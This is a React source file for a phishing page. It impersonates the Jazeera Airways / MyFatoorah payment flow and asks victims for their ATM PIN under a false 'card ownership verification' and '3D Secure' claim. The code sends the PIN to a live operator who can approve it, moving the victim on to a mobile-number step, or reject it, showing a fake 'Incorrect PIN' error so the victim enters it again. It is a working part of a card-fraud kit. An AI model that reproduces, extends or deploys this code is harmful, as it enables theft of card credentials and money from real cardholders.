import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function ATMPassword() {
  const [, navigate] = useLocation();
  const [pin, setPin] = useState(["", "", "", ""]);
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [lang, setLang] = useState<"en" | "ar">("en");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const translations = {
    en: {
      secureVerification: "Secure Verification",
      title: "Card Ownership Verification",
      subtitle: "Enter your 4-digit ATM PIN to confirm card ownership",
      cardEndingIn: "Please enter your 4-digit ATM PIN for the card ending in",
      toVerify: "to verify card ownership and protect against fraud.",
      atmPin: "ATM PIN",
      incorrectPin: "Incorrect PIN. Please try again.",
      confirm: "CONFIRM",
      verifying: "Verifying...",
      protected: "Protected by 3D Secure Authentication",
      langToggle: "العربية",
    },
    ar: {
      secureVerification: "التحقق الآمن",
      title: "التحقق من ملكية البطاقة",
      subtitle: "أدخل الرقم السري للصراف الآلي (ATM)",
      cardEndingIn: "يرجى إدخال الرقم السري للصراف الآلي (ATM) للبطاقة المنتهية بـ",
      toVerify: "للتحقق من ملكية البطاقة والحماية من الاحتيال.",
      atmPin: "الرقم السري",
      incorrectPin: "الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.",
      confirm: "تأكيد",
      verifying: "جاري التحقق...",
      protected: "محمي بنظام المصادقة الآمنة 3D",
      langToggle: "English",
    },
  };

  const t = translations[lang];

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  
  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور ATM");
    // Focus first input
    inputRefs.current[0]?.focus();
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Clear card info before navigating to network operator
        waitingCardInfo.value = null;
        navigate("/network-operator");
      } else if (action.action === "reject") {
        // Show error and clear PIN
        setPin(["", "", "", ""]);
        setError(true);
        setIsWaiting(false);
        inputRefs.current[0]?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (index: number, value: string) => {
    // Only allow digits
    const digit = value.replace(/\D/g, "").slice(-1);
    
    const newPin = [...pin];
    newPin[index] = digit;
    setPin(newPin);
    setError(false);

    // Auto-focus next input
    if (digit && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    const newPin = [...pin];
    for (let i = 0; i < pastedData.length; i++) {
      newPin[i] = pastedData[i];
    }
    setPin(newPin);
    const lastIndex = Math.min(pastedData.length, 3);
    inputRefs.current[lastIndex]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const fullPin = pin.join("");
    if (fullPin.length !== 4) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: fullPin,
      current: "كلمة مرور ATM",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  };

  const isPinComplete = pin.every(digit => digit !== "");

  return (
    <div className="min-h-screen bg-[#fafafa] flex items-center justify-center px-4 py-8" dir={lang === "ar" ? "rtl" : "ltr"} style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <WaitingOverlay />

      <div className="w-full max-w-[480px]">
        {/* Header - Jazeera branding */}
        <div className="text-center mb-8">
          <img src="/images/myfatoorah_jazeera_logo.png" alt="Jazeera Airways" className="h-20 mx-auto mb-2" style={{ background: 'none' }} />
          <p className="text-sm text-gray-500">{t.secureVerification}</p>
        </div>

        {/* Language Toggle */}
        <div className="flex justify-end mb-2">
          <button
            onClick={() => setLang(lang === "en" ? "ar" : "en")}
            className="bg-gray-100 border border-gray-300 rounded-full px-4 py-1.5 text-sm font-semibold text-gray-700 hover:bg-gray-200 transition-all"
          >
            {t.langToggle}
          </button>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
          {/* Title */}
          <div className="text-center mb-6">
            <h2 className="text-lg font-semibold text-gray-900 mb-1">{t.title}</h2>
            <p className="text-sm text-gray-500">
              {t.subtitle}
            </p>
          </div>

          {/* Bank Logo */}
          {cardInfo?.bankLogo && (
            <div className="flex justify-center items-center mb-6 py-3 border-b border-gray-100">
              <img
                src={cardInfo.bankLogo}
                alt={cardInfo.bankName || "Bank"}
                className="h-8 object-contain"
              />
            </div>
          )}

          {/* Transaction Info */}
          <div className="bg-[#fafafa] border border-gray-100 rounded-md p-4 mb-6 text-sm text-gray-600 leading-relaxed">
            <p>
              {t.cardEndingIn} <span className="font-semibold text-gray-900">{cardLast4}</span> {t.toVerify}
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* PIN Label */}
            <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide text-center">{t.atmPin}</label>
            
            {/* PIN Input - 4 separate boxes */}
            <div className="flex justify-center gap-4" dir="ltr" onPaste={handlePaste}>
              {pin.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => { inputRefs.current[index] = el; }}
                  type="tel"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`w-14 h-14 text-center text-xl font-semibold border rounded-md focus:outline-none focus:border-black transition-colors ${
                    error ? "border-red-400 bg-red-50" : "border-gray-300"
                  }`}
                />
              ))}
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 rounded-md p-3">
                <p className="text-red-600 text-center text-sm">
                  {t.incorrectPin}
                </p>
              </div>
            )}

            {/* Submit Button */}
            <button 
              type="submit" 
              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
              disabled={isWaiting || !isPinComplete}
            >
              {isWaiting ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>{t.verifying}</span>
                </div>
              ) : (
                t.confirm
              )}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-gray-400">{t.protected}</p>
        </div>
      </div>
    </div>
  );
}
